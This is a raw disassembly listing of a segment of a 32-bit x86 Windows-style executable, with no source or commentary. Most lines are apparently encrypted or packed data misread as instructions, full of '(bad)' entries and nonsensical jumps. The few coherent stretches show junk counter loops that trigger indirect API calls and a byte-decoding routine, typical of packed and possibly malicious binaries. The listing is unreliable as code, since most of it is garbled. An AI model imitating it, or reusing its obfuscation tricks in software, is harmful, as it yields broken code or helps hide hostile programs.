  4063e1:	add    al,0x4f
  4063e3:	les    eax,FWORD PTR ds:0x43b02908
  4063e9:	sahf   
  4063ea:	ror    BYTE PTR [ecx+0x28],0x25
  4063ee:	sub    BYTE PTR fs:[edi],ah
  4063f1:	lahf   
  4063f2:	les    ebp,FWORD PTR [esi-0x387a9766]
  4063f8:	ja     0x40643b
  4063fa:	mov    eax,0x1ab1461f
  4063ff:	mov    edi,0x9b6dce76
  406404:	mov    BYTE PTR [eax-0x7135eda3],dl
  40640a:	sbb    al,0xe
  40640c:	bound  esi,QWORD PTR [ecx+0x59]
  40640f:	aas    
  406410:	enter  0x3884,0x4c
  406414:	enter  0xa619,0xeb
  406418:	enter  0xe2b9,0x78
  40641c:	xlat   BYTE PTR ds:[ebx]
  40641d:	ins    BYTE PTR es:[edi],dx
  40641e:	push   ebx
  40641f:	shl    edx,cl
  406421:	sub    ch,BYTE PTR [edx+ebp*1]
  406424:	loopne 0x4064a0
  406426:	sub    BYTE PTR [edi-0xf],ch
  406429:	cdq    
  40642a:	sbb    al,0x58
  40642c:	mov    ah,0x8
  40642e:	add    BYTE PTR [eax-0x2ad6896b],bl
  406434:	xchg   esi,eax
  406435:	sub    eax,0x2f69efa6
  40643a:	(bad)  
  40643b:	ja     0x40644a
  40643d:	jge    0x4064be
  40643f:	push   0xd5743acf
  406444:	test   al,0xde
  406446:	lods   eax,DWORD PTR ds:[esi]
  406447:	test   BYTE PTR [esi],bh
  406449:	dec    esp
  40644a:	inc    esi
  40644b:	int    0x85
  40644d:	adc    eax,0xc0ec8d30
  406452:	test   DWORD PTR [ecx],esi
  406454:	addr16 sbb eax,0x3e75cea8
  40645a:	lahf   
  40645b:	inc    ebx
  40645c:	sub    edi,DWORD PTR [ebx]
  40645e:	mov    dl,0x53
  406460:	inc    DWORD PTR [ebp+0x2e]
  406463:	out    0x22,al
  406465:	pushf  
  406466:	xor    al,BYTE PTR [eax+0x3dc6922a]
  40646c:	push   es
  40646d:	jnp    0x406409
  40646f:	in     al,0x93
  406471:	sbb    al,0xcb
  406473:	outs   dx,BYTE PTR ds:[esi]
  406474:	jmp    0x40b270b
  406479:	out    dx,eax
  40647a:	lds    edx,FWORD PTR [edx]
  40647c:	jp     0x4064b3
  40647e:	cmp    ecx,DWORD PTR [edx+0xcf5b6cc]
  406484:	sti    
  406485:	sub    dh,BYTE PTR [ecx]
  406487:	(bad)  
  406488:	jmp    0xcbea332a
  40648d:	cwde   
  40648e:	fiadd  WORD PTR [eax]
  406490:	(bad)  
  406491:	mov    ds:0x7dd78063,eax
  406496:	mov    eax,0xa12a8839
  40649b:	jmp    0x4064e0
  40649d:	repnz mov edi,DWORD PTR [ebp-0x13]
  4064a1:	lods   al,BYTE PTR ds:[esi]
  4064a2:	jns    0x4064d1
  4064a4:	imul   ebx,DWORD PTR [ebp+eax*4-0x75],0x49
  4064a9:	push   esp
  4064aa:	dec    esi
  4064ab:	sbb    BYTE PTR ds:0xc231e584,bh
  4064b1:	mov    ah,0x4a
  4064b3:	rcr    DWORD PTR [eax+ebp*1+0x2c07c0b3],1
  4064ba:	jle    0x4064ce
  4064bc:	in     al,dx
  4064bd:	test   DWORD PTR [edi],ecx
  4064bf:	and    edi,DWORD PTR [ebx-0x61522f2a]
  4064c5:	cmp    DWORD PTR [ebp+eiz*8+0x3c],edi
  4064c9:	cmp    ebx,DWORD PTR [edx+ebp*2]
  4064cc:	mov    dl,0x2
  4064ce:	adc    esi,DWORD PTR [edi+eiz*1]
  4064d1:	in     al,0x5a
  4064d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064d4:	call   0xf52e:0xce5081f5
  4064db:	(bad)  
  4064dc:	out    dx,al
  4064dd:	sti    
  4064de:	(bad)  
  4064df:	xlat   BYTE PTR ds:[ebx]
  4064e0:	jmp    0x6c36:0xd54730ef
  4064e7:	xchg   edi,eax
  4064e8:	cdq    
  4064e9:	add    ecx,DWORD PTR [ecx+0x7a]
  4064ec:	lds    ebp,FWORD PTR ds:0x18ae9cf7
  4064f2:	lahf   
  4064f3:	jno    0x406532
  4064f5:	jbe    0x40653a
  4064f7:	int    0x8b
  4064f9:	sar    BYTE PTR [ebp-0x72711db2],0xd7
  406500:	sub    BYTE PTR [ebp-0x726ddefc],dh
  406506:	fisttp WORD PTR [ecx]
  406508:	xor    ebx,edx
  40650a:	fisubr WORD PTR [eax+ebx*4-0x7eec37ec]
  406511:	arpl   WORD PTR ds:0x94cf2361,cx
  406517:	mov    cl,0x20
  406519:	mov    ds,WORD PTR [ecx-0x3247ac20]
  40651f:	lods   al,BYTE PTR ds:[esi]
  406520:	sbb    al,BYTE PTR [eax+ebp*1]
  406523:	out    0xa6,al
  406525:	mov    ebx,0x726376d1
  40652a:	addr16 int3 
  40652c:	daa    
  40652d:	xchg   edx,eax
  40652e:	adc    al,0x1f
  406530:	call   0x2223fbcc
  406535:	(bad)  [esi+0x25]
  406538:	stc    
  406539:	inc    esp
  40653a:	push   esi
  40653b:	in     eax,dx
  40653c:	xor    al,0xfe
  40653e:	test   dl,ah
  406540:	pop    ebp
  406541:	stos   BYTE PTR es:[edi],al
  406542:	pop    es
  406543:	out    dx,al
  406544:	mov    ebp,0x182ab5e4
  406549:	xchg   ebx,eax
  40654a:	mov    eax,0x1f31cda8
  40654f:	imul   edx,eax,0x748a88aa
  406555:	sbb    eax,0xb124f07
  40655a:	jnp    0x406580
  40655c:	mov    es,WORD PTR [ebx+0x5]
  40655f:	xor    eax,0xed6e7d6e
  406564:	jmp    0xd22911cc
  406569:	dec    edx
  40656a:	inc    esp
  40656b:	aad    0x41
  40656d:	fsubr  DWORD PTR [ebx]
  40656f:	push   ss
  406570:	fldl2e 
  406572:	mov    cl,0xcd
  406574:	nop
  406575:	push   ss
  406576:	clc    
  406577:	mov    dl,0x8f
  406579:	dec    esi
  40657a:	scas   eax,DWORD PTR es:[edi]
  40657b:	mov    ebx,0xac31fd2c
  406580:	mov    al,ds:0x2ebb522b
  406585:	xchg   DWORD PTR [ecx],edx
  406587:	or     ebx,esi
  406589:	dec    eax
  40658a:	icebp  
  40658b:	xor    BYTE PTR [edx+0x2ca6f82b],ah
  406591:	adc    eax,0x13e11ffa
  406596:	xchg   BYTE PTR [esi+0x67],dl
  406599:	cmp    DWORD PTR [ebx+0x16],ebp
  40659c:	lea    ecx,[eax-0x3bf2f85f]
  4065a2:	push   edx
  4065a3:	in     eax,dx
  4065a4:	ror    DWORD PTR [edx-0x6a],1
  4065a7:	inc    ebx
  4065a8:	cmp    ebx,DWORD PTR [ebp+0x36954b75]
  4065ae:	push   0x6d5d5b17
  4065b3:	jge    0x406613
  4065b5:	mov    ebp,eax
  4065b7:	mov    fs,edi
  4065b9:	(bad)  
  4065ba:	inc    DWORD PTR [ebp+0x25840fc0]
  4065c0:	add    BYTE PTR [eax],al
  4065c2:	add    BYTE PTR [ebp-0x74af77bb],cl
  4065c8:	inc    ebp
  4065c9:	in     al,dx
  4065ca:	xor    eax,esi
  4065cc:	add    eax,edi
  4065ce:	push   eax
  4065cf:	mov    eax,DWORD PTR [ebp-0x10]
  4065d2:	add    eax,0xee
  4065d7:	push   eax
  4065d8:	mov    eax,DWORD PTR [ebp-0x10]
  4065db:	mov    eax,DWORD PTR [eax+0x198]
  4065e1:	push   DWORD PTR [eax]
  4065e3:	call   0x40cdc5
  4065e8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4065eb:	xor    ecx,esi
  4065ed:	jmp    0x4067e5
  4065f2:	fwait
  4065f3:	imul   edx,eax,0x42
  4065f6:	shl    BYTE PTR [ecx-0x57],1
  4065f9:	jae    0x406585
  4065fb:	sbb    edi,DWORD PTR [edx+edx*1+0x7e8faf7]
  406602:	sub    edi,DWORD PTR [edi]
  406604:	jle    0x406684
  406606:	push   ebp
  406607:	jg     0x406687
  406609:	jle    0x406642
  40660b:	clc    
  40660c:	pop    esp
  40660d:	dec    esi
  40660e:	mov    eax,ds:0xa62d5dcf
  406613:	fisttp DWORD PTR [esi+0x73]
  406616:	pop    eax
  406617:	aas    
  406618:	sub    DWORD PTR [ecx+0x4e3bcd4e],ebx
  40661e:	in     al,0x9a
  406620:	neg    cl
  406622:	pop    edx
  406623:	dec    edi
  406624:	es inc edi
  406626:	jns    0x4065fc
  406628:	out    0xbf,al
  40662a:	xchg   esi,eax
  40662b:	(bad)  
  40662c:	ins    DWORD PTR es:[edi],dx
  40662d:	mov    dh,0xa0
  40662f:	inc    edi
  406630:	lods   al,BYTE PTR ds:[esi]
  406631:	sbb    bl,ch
  406633:	push   ds
  406634:	sbb    eax,0xd0bd9fbd
  406639:	mov    eax,ds:0x525f5609
  40663e:	push   esp
  40663f:	ret    0x86f
  406642:	xlat   BYTE PTR ds:[ebx]
  406643:	inc    eax
  406644:	push   eax
  406645:	gs popa 
  406647:	jno    0x406638
  406649:	pop    edi
  40664a:	les    eax,FWORD PTR [ecx+ebp*1]
  40664d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40664e:	jecxz  0x406645
  406650:	pop    esp
  406651:	rol    DWORD PTR [ebp+0x22],1
  406654:	fdivrp st(2),st
  406656:	push   esp
  406657:	aam    0x69
  406659:	mov    dl,0xae
  40665b:	mov    ah,0x62
  40665d:	test   ch,ch
  40665f:	out    0x58,al
  406661:	(bad)  
  406662:	ror    eax,cl
  406664:	cld    
  406665:	(bad)  
  406666:	aaa    
  406667:	sbb    eax,0x79c97d7b
  40666c:	js     0x40660f
  40666e:	push   esp
  40666f:	imul   ecx,DWORD PTR [eax],0x30
  406672:	cdq    
  406673:	pop    ds
  406674:	jp     0x40667b
  406676:	mov    ch,BYTE PTR [ecx+edi*8+0x4601d065]
  40667d:	and    DWORD PTR [eax+0x35ff6af3],ecx
  406683:	inc    ebx
  406684:	jb     0x4066e5
  406686:	dec    ebx
  406687:	xor    al,0xe2
  406689:	dec    esp
  40668a:	nop
  40668b:	xchg   esi,eax
  40668c:	pop    ebp
  40668d:	adc    ch,BYTE PTR gs:[edi+0x3c]
  406691:	dec    ebx
  406692:	or     al,ah
  406694:	(bad)  [ecx+ebx*4-0x19]
  406698:	or     ch,BYTE PTR [ecx]
  40669a:	add    DWORD PTR [ecx+0x6c35794e],esp
  4066a0:	add    edx,DWORD PTR [edx]
  4066a2:	aad    0x3
  4066a4:	xor    BYTE PTR [edx+0x657a8650],cl
  4066aa:	inc    ebp
  4066ab:	inc    esp
  4066ac:	mov    ah,BYTE PTR ds:0x2285185a
  4066b2:	js     0x40671c
  4066b4:	inc    eax
  4066b5:	pop    eax
  4066b6:	mov    WORD PTR [ecx-0x59b15015],?
  4066bc:	out    0x91,al
  4066be:	xlat   BYTE PTR ds:[ebx]
  4066bf:	mov    ebp,0xe5a40b64
  4066c4:	xor    eax,0x19ea536d
  4066c9:	aad    0x73
  4066cb:	adc    eax,0x4cdcd274
  4066d0:	test   DWORD PTR [edi-0x177d472d],esp
  4066d6:	cmp    DWORD PTR [esi+0x37],0x4db39ad3
  4066dd:	jo     0x40675d
  4066df:	lods   eax,DWORD PTR ds:[esi]
  4066e0:	dec    esp
  4066e1:	shl    BYTE PTR [esi],1
  4066e3:	jg     0x406698
  4066e5:	or     BYTE PTR [edx+0x18],al
  4066e8:	sub    al,0x5c
  4066ea:	jle    0x406707
  4066ec:	sbb    ebx,DWORD PTR [esi-0x2e45a29f]
  4066f2:	or     eax,0x6af1af25
  4066f7:	adc    esi,DWORD PTR [ecx+ebx*8+0x769beb21]
  4066fe:	dec    ecx
  4066ff:	daa    
  406700:	out    0x75,al
  406702:	cdq    
  406703:	loop   0x406691
  406705:	mov    al,ds:0x50d18364
  40670a:	leave  
  40670b:	cmp    BYTE PTR [ebx+edi*8-0x28],bh
  40670f:	mov    eax,DWORD PTR [edi+edi*4]
  406712:	(bad)  
  406713:	pushf  
  406714:	je     0x40675d
  406716:	lock shr BYTE PTR [ebx*8-0x27e3c9f0],0x59
  40671f:	stos   BYTE PTR es:[edi],al
  406720:	add    al,0x42
  406722:	(bad)  
  406723:	dec    edi
  406724:	pop    esp
  406725:	rcl    DWORD PTR [eax],0x10
  406728:	jmp    0xcf73413
  40672d:	pop    ss
  40672e:	div    DWORD PTR ss:[ebp-0x2e02900a]
  406735:	jb     0x4066fc
  406737:	cmp    BYTE PTR [ebp+0x1d903304],ah
  40673d:	jmp    0x982eb81d
  406742:	push   ds
  406743:	outs   dx,DWORD PTR ds:[esi]
  406744:	or     al,0xcc
  406746:	(bad)  
  406747:	xor    esp,DWORD PTR [esi-0x7b]
  40674a:	ins    BYTE PTR es:[edi],dx
  40674b:	and    al,0x39
  40674d:	sub    bl,0x1d
  406750:	fdivr  DWORD PTR ds:0x49b3c2f2
  406756:	push   ebx
  406757:	xlat   BYTE PTR ds:[ebx]
  406758:	xor    DWORD PTR [eax-0x7a],ebx
  40675b:	les    esi,FWORD PTR [edi]
  40675d:	inc    esi
  40675e:	jns    0x4067b9
  406760:	jbe    0x406780
  406762:	pushf  
  406763:	lock jecxz 0x4066ee
  406766:	push   0x1d
  406768:	jb     0x4067ad
  40676a:	and    BYTE PTR [edx-0x3ca6e5ee],dl
  406770:	ret    0x902c
  406773:	mov    ds:0x474f9ee2,eax
  406778:	fcom   DWORD PTR [ebp+0x752e3d62]
  40677e:	adc    al,0x21
  406780:	mov    al,0x6
  406782:	or     eax,0x796c145e
  406787:	lock neg BYTE PTR [ecx-0x36626ee8]
  40678e:	leave  
  40678f:	sbb    al,0xb
  406791:	jle    0x40679b
  406793:	sub    ebp,0xe6eb1214
  406799:	adc    al,0xc7
  40679b:	lea    eax,[ebx]
  40679d:	sub    al,0xa0
  40679f:	or     eax,0xb2cf76c0
  4067a4:	loopne 0x4067e3
  4067a6:	ins    DWORD PTR es:[edi],dx
  4067a7:	cwde   
  4067a8:	aas    
  4067a9:	shr    BYTE PTR [ecx-0x20],1
  4067ac:	in     al,0x82
  4067ae:	(bad)  
  4067af:	in     al,0x53
  4067b1:	cdq    
  4067b2:	lds    ebp,FWORD PTR [ecx]
  4067b4:	mov    edi,0x72443410
  4067b9:	cmp    DWORD PTR [edi-0x2525ed5c],edx
  4067bf:	popf   
  4067c0:	xchg   edi,eax
  4067c1:	mov    dh,0xd1
  4067c3:	adc    DWORD PTR [edi+0x1e6d345f],ecx
  4067c9:	fldenv [edx]
  4067cb:	xlat   BYTE PTR ds:[ebx]
  4067cc:	aas    
  4067cd:	std    
  4067ce:	retf   
  4067cf:	push   esi
  4067d0:	stos   BYTE PTR es:[edi],al
  4067d1:	adc    BYTE PTR [ebx+0x21],dh
  4067d4:	lods   al,BYTE PTR ds:[esi]
  4067d5:	int    0x3b
  4067d7:	push   0xc0e83365
  4067dc:	cmc    
  4067dd:	xchg   edx,eax
  4067de:	js     0x406852
  4067e0:	(bad)  
  4067e1:	or     al,0x1f
  4067e3:	sti    
  4067e4:	add    DWORD PTR [eax-0x32729b],edi
  4067ea:	sub    eax,ecx
  4067ec:	sub    eax,DWORD PTR [ebp-0x8]
  4067ef:	mov    ecx,DWORD PTR [ebp-0x30]
  4067f2:	add    ecx,eax
  4067f4:	mov    eax,DWORD PTR [ebp-0x8]
  4067f7:	mov    DWORD PTR [eax+0x1],ecx
  4067fa:	mov    al,BYTE PTR [ebp-0x1]
  4067fd:	mov    ecx,DWORD PTR [ebp-0x8]
  406800:	xor    al,0x46
  406802:	sub    al,0x38
  406804:	mov    BYTE PTR [ecx],al
  406806:	lea    eax,[ebp-0x8]
  406809:	inc    BYTE PTR [eax]
  40680b:	inc    eax
  40680c:	push   eax
  40680d:	pop    ecx
  40680e:	dec    ecx
  40680f:	xchg   ecx,edx
  406811:	dec    BYTE PTR [edx]
  406813:	push   DWORD PTR [ebp-0x10]
  406816:	mov    eax,ds:0x412264
  40681b:	mov    eax,DWORD PTR [eax]
  40681d:	push   DWORD PTR [eax]
  40681f:	lea    eax,ds:0x412280
  406825:	push   DWORD PTR [eax]
  406827:	lea    eax,ds:0x41202c
  40682d:	push   DWORD PTR [eax]
  40682f:	lea    eax,ds:0x412260
  406835:	push   DWORD PTR [eax]
  406837:	lea    eax,ds:0x4122f4
  40683d:	push   DWORD PTR [eax]
  40683f:	xchg   ebx,edx
  406841:	inc    ebx
  406842:	inc    ebx
  406843:	sub    ebx,0x3
  406846:	push   ebx
  406847:	jmp    0x406a3f
  40684c:	xchg   edx,eax
  40684d:	lods   al,BYTE PTR ds:[esi]
  40684e:	sbb    eax,0x91ab211a
  406853:	mov    ah,0x54
  406855:	jmp    0xb74d:0x9967f6f1
  40685c:	push   cs
  40685d:	cmp    eax,0x7f557e7e
  406862:	jle    0x4068e2
  406864:	inc    edi
  406865:	cmc    
  406866:	rcl    DWORD PTR [edx+0x58],0xc
  40686a:	popa   
  40686b:	ficomp DWORD PTR [eax]
  40686d:	call   0x58f2:0xb8d1ab82
  406874:	push   ebx
  406875:	popf   
  406876:	repnz pop esi
  406878:	xchg   WORD PTR [eax+eiz*2+0x3],di
  40687d:	mov    ecx,0xed42030
  406882:	jmp    0x406896
  406884:	enter  0x7f6,0x17
  406888:	xlat   BYTE PTR ds:[ebx]
  406889:	sti    
  40688a:	ds jns 0x40682e
  40688d:	call   0xc13bb52
  406892:	or     al,0xe8
  406894:	add    bh,ch
  406896:	lods   eax,DWORD PTR ds:[esi]
  406897:	push   es
  406898:	out    dx,al
  406899:	cmp    DWORD PTR [ecx-0x29],esp
  40689c:	enter  0x6bc5,0x56
  4068a0:	js     0x4068ec
  4068a2:	rcl    BYTE PTR [ecx+0x2633f94a],1
  4068a8:	ins    BYTE PTR es:[edi],dx
  4068a9:	inc    esp
  4068aa:	pop    eax
  4068ab:	nop
  4068ac:	(bad)  
  4068ad:	lea    edi,[ecx+0x578a3777]
  4068b3:	add    DWORD PTR [ebp+0x3b0af0e3],edi
  4068b9:	fcom   QWORD PTR [ebx+0x21]
  4068bc:	sbb    DWORD PTR [esi],esp
  4068be:	leave  
  4068bf:	pop    esi
  4068c0:	cmp    eax,0x8cafd2e5
  4068c5:	jo     0x4068f4
  4068c7:	inc    esp
  4068c8:	mov    ah,0x9a
  4068ca:	pop    ebx
  4068cb:	inc    esi
  4068cc:	dec    esi
  4068cd:	jo     0x40686d
  4068cf:	and    cl,dh
  4068d1:	dec    eax
  4068d2:	ffree  st(2)
  4068d4:	(bad)  
  4068d6:	or     ch,dl
  4068d8:	add    DWORD PTR [ecx+0x406f174b],edi
  4068de:	inc    edi
  4068df:	into   
  4068e0:	push   ebp
  4068e1:	es xchg esp,eax
  4068e3:	mov    dl,0xd2
  4068e5:	jg     0x406948
  4068e7:	enter  0x9f87,0xd6
  4068eb:	sub    ch,BYTE PTR [esi+ecx*4]
  4068ee:	lods   al,BYTE PTR ds:[esi]
  4068ef:	and    al,0x65
  4068f1:	addr16 in eax,dx
  4068f3:	push   0xb78e4eb1
  4068f8:	es jbe 0x4068e0
  4068fb:	adc    ecx,eax
  4068fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068fe:	sahf   
  4068ff:	cwde   
  406900:	cmp    bh,BYTE PTR [ebx]
  406902:	ror    BYTE PTR ds:0xba632646,1
  406908:	js     0x4068fa
  40690a:	in     eax,dx
  40690b:	and    al,0x60
  40690d:	hlt    
  40690e:	int    0xd9
  406910:	pop    ecx
  406911:	bound  ecx,QWORD PTR [eiz*8-0x76d2a33b]
  406918:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406919:	retf   
  40691a:	pop    ebx
  40691b:	pop    ss
  40691c:	loopne 0x40690e
  40691e:	mov    eax,0xd1d7f861
  406923:	loopne 0x406973
  406925:	inc    esp
  406926:	ss mov cl,0x3c
  406929:	adc    ch,cl
  40692b:	rcr    ebx,cl
  40692d:	mov    eax,ds:0x7c64bff8
  406932:	inc    ebp
  406933:	add    ebx,DWORD PTR [eax+ebp*8-0x455a40f]
  40693a:	adc    ah,BYTE PTR [ecx]
  40693c:	push   ebp
  40693d:	jmp    0x406977
  40693f:	stos   DWORD PTR es:[edi],eax
  406940:	outs   dx,BYTE PTR gs:[esi]
  406942:	daa    
  406943:	xor    DWORD PTR [edx+0x68],edi
  406946:	xor    DWORD PTR [eax-0x3294721a],edi
  40694c:	popf   
  40694d:	lods   eax,DWORD PTR ds:[esi]
  40694e:	mov    ebp,0xb69469ce
  406953:	mov    bl,0xd
  406955:	shl    cl,cl
  406957:	or     al,0x53
  406959:	mov    dh,0x94
  40695b:	jecxz  0x406959
  40695d:	lods   al,BYTE PTR ds:[esi]
  40695e:	jae    0x40694a
  406960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406961:	ja     0x406919
  406963:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406964:	pop    eax
  406965:	xchg   ecx,eax
  406966:	inc    ebp
  406967:	mov    bl,0xea
  406969:	mov    edx,0x17f8f292
  40696e:	push   ss
  40696f:	jmp    0x4068fc
  406971:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406972:	lock ror BYTE PTR [ecx-0x67c842f7],cl
  406979:	leave  
  40697a:	shl    DWORD PTR [esi+0x4f],1
  40697d:	mov    WORD PTR [edi],ds
  40697f:	jmp    0x4069a5
  406981:	xor    DWORD PTR [edi],edx
  406983:	fst    st(1)
  406985:	or     al,0x2b
  406987:	repnz pushfw 
  40698a:	enter  0x4aa5,0x29
  40698e:	jl     0x406935
  406990:	mov    esi,0xdab3573d
  406995:	adc    BYTE PTR [edx],al
  406997:	sub    al,0x67
  406999:	loopne 0x4069e6
  40699b:	inc    edx
  40699c:	inc    edx
  40699d:	sub    ebx,DWORD PTR [ebp+0x47]
  4069a0:	sub    ebx,DWORD PTR [edx]
  4069a2:	int3   
  4069a3:	mov    dh,0x5f
  4069a5:	out    0xab,al
  4069a7:	lahf   
  4069a8:	add    BYTE PTR [ebx+0x6e],al
  4069ab:	ins    BYTE PTR es:[edi],dx
  4069ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069ad:	mov    DWORD PTR [esp+esi*1],edi
  4069b0:	xchg   ecx,eax
  4069b1:	adc    DWORD PTR [esi+0x5e],0xe
  4069b5:	scas   eax,DWORD PTR es:[edi]
  4069b6:	stos   DWORD PTR es:[edi],eax
  4069b7:	out    0x6d,eax
  4069b9:	or     BYTE PTR [edx+0x5c7d8b76],ah
  4069bf:	sub    eax,0x8493c2db
  4069c4:	aas    
  4069c5:	pushf  
  4069c6:	aad    0x24
  4069c8:	sub    DWORD PTR [edi],esp
  4069ca:	sahf   
  4069cb:	pop    esp
  4069cc:	fdiv   st(5),st
  4069ce:	shl    BYTE PTR [ecx],0x79
  4069d1:	push   cs
  4069d2:	mov    ebx,0xc19d9a2b
  4069d7:	(bad)  
  4069d8:	into   
  4069d9:	adc    dh,BYTE PTR [ebp+ecx*1-0x3ac253c7]
  4069e0:	and    eax,0x56cab98
  4069e5:	sbb    al,0x82
  4069e7:	(bad)  
  4069e8:	in     al,dx
  4069e9:	arpl   WORD PTR [esi-0x7e],cx
  4069ec:	scas   al,BYTE PTR es:[edi]
  4069ed:	inc    ecx
  4069ee:	cmp    eax,ebx
  4069f0:	mov    ebx,0xa932aec9
  4069f5:	xlat   BYTE PTR ds:[ebx]
  4069f6:	mov    ch,BYTE PTR [eax+0x3c636cb7]
  4069fc:	mov    al,0x56
  4069fe:	mov    edx,0x74ee3ddd
  406a03:	(bad)  
  406a04:	loop   0x4069f4
  406a06:	arpl   WORD PTR [edx-0x760a2dfe],cx
  406a0c:	stos   BYTE PTR es:[edi],al
  406a0d:	cmp    DWORD PTR [edi+ebp*4+0x4a6db8ef],ebx
  406a14:	fcomp  DWORD PTR [ecx-0x48]
  406a17:	push   cs
  406a18:	add    eax,0xb672ffd6
  406a1d:	(bad)  
  406a1e:	rcr    BYTE PTR [esi+ecx*8],1
  406a21:	test   BYTE PTR [ecx+0x4bd8b619],ch
  406a27:	xchg   esi,eax
  406a28:	adc    eax,DWORD PTR [ebx-0x17]
  406a2b:	fistp  DWORD PTR [esi+esi*8-0x1cd153]
  406a32:	push   cs
  406a33:	cmc    
  406a34:	inc    eax
  406a35:	pop    ecx
  406a36:	cmp    eax,0x9da10d9b
  406a3b:	loope  0x406a94
  406a3d:	imul   ebx,DWORD PTR [edx+0x150ff58],0x8be0458b
  406a47:	or     eax,0x412224
  406a4c:	add    DWORD PTR [eax],ecx
  406a4e:	pop    edi
  406a4f:	pop    esi
  406a50:	pop    ebx
  406a51:	leave  
  406a52:	ret    
  406a53:	push   ebp
  406a54:	mov    ebp,esp
  406a56:	sub    esp,0x44
  406a59:	push   edi
  406a5a:	mov    DWORD PTR ds:0x42ede3,0x1a
  406a64:	cmp    DWORD PTR ds:0x42ede3,0x0
  406a6b:	je     0x406ab1
  406a71:	cmp    DWORD PTR ds:0x42ede3,0x25
  406a78:	jne    0x406a8a
  406a7e:	push   DWORD PTR [ebp-0x1c]
  406a81:	push   DWORD PTR [ebp-0x20]
  406a84:	call   DWORD PTR ds:0x42ec1b
  406a8a:	xor    edi,edi
  406a8c:	add    edi,DWORD PTR ds:0x42ede3
  406a92:	dec    edi
  406a93:	mov    DWORD PTR ds:0x42ede3,edi
  406a99:	jmp    0x406a64
  406a9e:	movzx  edi,BYTE PTR ds:0x4304e7
  406aa5:	xor    edi,DWORD PTR ds:0x430435
  406aab:	mov    DWORD PTR ds:0x4304e7,edi
  406ab1:	mov    eax,DWORD PTR [ebp+0xc]
  406ab4:	and    edx,edi
  406ab6:	mov    DWORD PTR [ebp-0x10],eax
  406ab9:	mov    eax,DWORD PTR [ebp+0x8]
  406abc:	and    DWORD PTR ds:0x43045d,0x0
  406ac6:	mov    ecx,DWORD PTR ds:0x43045d
  406acc:	inc    ecx
  406acd:	mov    DWORD PTR ds:0x43045d,ecx
  406ad3:	cmp    DWORD PTR ds:0x43045d,0x23
  406ada:	jne    0x406af9
  406ae0:	push   0x42e8b7
  406ae5:	push   DWORD PTR [ebp-0x28]
  406ae8:	push   DWORD PTR [ebp-0x28]
  406aeb:	push   0x2078
  406af0:	push   DWORD PTR [ebp-0x10]
  406af3:	call   DWORD PTR ds:0x42ec1f
  406af9:	cmp    DWORD PTR ds:0x43045d,0x1c
  406b00:	jb     0x406ac6
  406b06:	or     edi,0x11f2
  406b0c:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  406b13:	mov    DWORD PTR ds:0x4304df,0x15
  406b1d:	cmp    DWORD PTR ds:0x4304df,0x0
  406b24:	je     0x406b57
  406b2a:	cmp    DWORD PTR ds:0x4304df,0x16
  406b31:	jne    0x406b3d
  406b37:	call   DWORD PTR ds:0x42e9df
  406b3d:	xor    ecx,ecx
  406b3f:	xor    ecx,DWORD PTR ds:0x4304df
  406b45:	dec    ecx
  406b46:	mov    DWORD PTR ds:0x4304df,ecx
  406b4c:	jmp    0x406b1d
  406b51:	sub    DWORD PTR ds:0x430435,ebx
  406b57:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  406b5e:	mov    edx,DWORD PTR [ebp+0x8]
  406b61:	sbb    edi,edi
  406b63:	mov    DWORD PTR [ebp-0x40],eax
  406b66:	mov    eax,0x7510854
  406b6b:	and    DWORD PTR ds:0x4304d7,0x0
  406b75:	jmp    0x406b87
  406b7a:	mov    ecx,DWORD PTR ds:0x4304d7
  406b80:	inc    ecx
  406b81:	mov    DWORD PTR ds:0x4304d7,ecx
  406b87:	cmp    DWORD PTR ds:0x4304d7,0x11
  406b8e:	jae    0x406bc3
  406b94:	cmp    DWORD PTR ds:0x4304d7,0x1e
  406b9b:	jne    0x406bbe
  406ba1:	push   DWORD PTR [ebp-0x1c]
  406ba4:	push   0x42e7e6
  406ba9:	push   0x798e
  406bae:	push   0x8b33
  406bb3:	push   0x403f
  406bb8:	call   DWORD PTR ds:0x42eaa7
  406bbe:	jmp    0x406b7a
  406bc3:	xor    edx,eax
  406bc5:	xor    ecx,ecx
  406bc7:	xor    ecx,DWORD PTR ds:0x42e7c8
  406bcd:	add    DWORD PTR ds:0x43043d,ecx
  406bd3:	mov    ecx,0x32729b
  406bd8:	movzx  edi,WORD PTR ds:0x42edcb
  406bdf:	and    edi,DWORD PTR ds:0x4304e3
  406be5:	mov    DWORD PTR ds:0x42edcb,edi
  406beb:	jmp    0x406d9c
  406bf0:	cld    
  406bf1:	ss aam 0xb
  406bf4:	je     0x406bdf
  406bf6:	inc    ecx
  406bf7:	mov    cl,0xca
  406bf9:	mov    ebp,0x6af77504
  406bfe:	les    edx,FWORD PTR [ebx]
  406c00:	cmp    bh,BYTE PTR gs:[esi+0x7e]
  406c04:	mov    bh,BYTE PTR [edi+0x7e]
  406c07:	jle    0x406c53
  406c09:	dec    ebp
  406c0a:	(bad)  
  406c0b:	mov    edx,0x7d79b733
  406c10:	push   ebp
  406c11:	mov    DWORD PTR [esi-0x4b],eax
  406c14:	jmp    0x406b9b
  406c16:	lods   eax,DWORD PTR ds:[esi]
  406c17:	jno    0x406bc0
  406c19:	pop    ss
  406c1a:	out    dx,eax
  406c1b:	push   0xfe8adcb7
  406c20:	xchg   ebx,eax
  406c21:	mov    edi,0xe594162e
  406c26:	and    eax,0xeb2d9344
  406c2b:	mov    edx,0xf40baf07
  406c30:	or     esp,edx
  406c32:	int    0x5b
  406c34:	cdq    
  406c35:	outs   dx,BYTE PTR ds:[esi]
  406c36:	mov    DWORD PTR ds:0x25d1465d,esi
  406c3c:	jg     0x406ca3
  406c3e:	jp     0x406c9a
  406c40:	and    esi,edx
  406c42:	pop    ebp
  406c43:	std    
  406c44:	mov    DWORD PTR [esi-0x25],ecx
  406c47:	push   esi
  406c48:	fidiv  DWORD PTR [edi+0x5b]
  406c4b:	inc    ebp
  406c4c:	mov    ecx,0xcfa7c1cc
